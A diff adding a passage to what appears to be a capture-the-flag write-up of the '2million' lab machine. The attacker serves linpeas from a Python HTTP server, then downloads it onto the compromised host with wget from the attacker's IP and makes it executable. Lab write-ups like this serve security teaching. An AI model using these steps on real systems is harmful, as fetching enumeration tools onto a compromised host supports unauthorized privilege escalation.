@@ -871,4 +871,33 @@ admin@2million:~$
 
 ```
 
+``` bash
 
+❯ which linpeas
+/usr/bin/linpeas
+❯ cd /usr/bin/
+❯ python3 -m http.server 9090
+
+Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
+10.129.229.66 - - [30/Jul/2026 03:25:46] "GET /linpeas HTTP/1.1" 200 -
+
+
+```
+
+``` bash
+
+admin@2million:~$ wget http://10.10.15.242:9090/linpeas
+--2026-07-30 01:25:33--  http://10.10.15.242:9090/linpeas
+Connecting to 10.10.15.242:9090... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 82 [application/octet-stream]
+Saving to: ‘linpeas’
+
+linpeas                       100%[=================================================>]      82  --.-KB/s    in 0s
+
+2026-07-30 01:25:33 (10.9 MB/s) - ‘linpeas’ saved [82/82]
+
+admin@2million:~$ chmod +x linpeas
+admin@2million:~$
+
+```
